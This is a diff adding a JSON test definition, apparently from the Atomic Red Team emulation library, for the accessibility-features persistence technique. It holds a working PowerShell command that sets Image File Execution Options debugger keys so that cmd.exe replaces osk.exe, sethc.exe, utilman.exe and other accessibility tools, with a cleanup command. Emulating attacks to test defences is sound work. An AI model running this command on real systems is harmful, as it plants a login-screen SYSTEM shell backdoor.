@@ -1,0 +1,37 @@
+{
+    "name": "Attaches Command Prompt as a Debugger to a List of Target Processes",
+    "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables. Upon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n",
+        "cleanup_command": "$input_table = \"#{parent_list}\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2>&1 | Out-Null\n}\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1546.008",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Accessibility Features",
+    "source": "ART",
+    "uuid": "3309f53e-b22b-4eb6-8fd2-a6cf58b355a9",
+    "arguments": {
+        "parent_list": {
+            "description": "Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"\n",
+            "type": "string",
+            "default": "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"
+        },
+        "attached_process": {
+            "description": "Full path to process to attach to target in #{parent_list}. Default: cmd.exe\n",
+            "type": "path",
+            "default": "C:\\windows\\system32\\cmd.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
